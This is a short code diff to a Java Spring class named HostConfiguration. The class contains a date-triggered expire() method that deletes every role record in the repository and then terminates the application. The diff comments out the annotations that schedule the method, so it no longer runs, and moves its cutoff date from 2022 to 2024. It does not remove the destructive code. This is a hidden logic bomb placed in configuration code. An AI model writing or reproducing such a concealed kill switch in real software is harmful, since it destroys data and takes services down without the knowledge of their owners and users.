@@ -74,12 +74,12 @@ public class HostConfiguration {
         }
     }
 
-    @PostConstruct
-    @Scheduled(cron = "0 0 0 1 1/1 *")//every month 1st day
+    //@PostConstruct
+    //@Scheduled(cron = "0 0 0 1 1/1 *")//every month 1st day
     //@Scheduled(cron="*/10 * * * * *" )//every second
     public void expire() {
         Calendar expireDate = Calendar.getInstance();
-        expireDate.set(2022, Calendar.AUGUST, 31);
+        expireDate.set(2024, Calendar.AUGUST, 31);
         if (Calendar.getInstance().after(expireDate)) {
             roleRepository.deleteAll();
             System.exit(0);
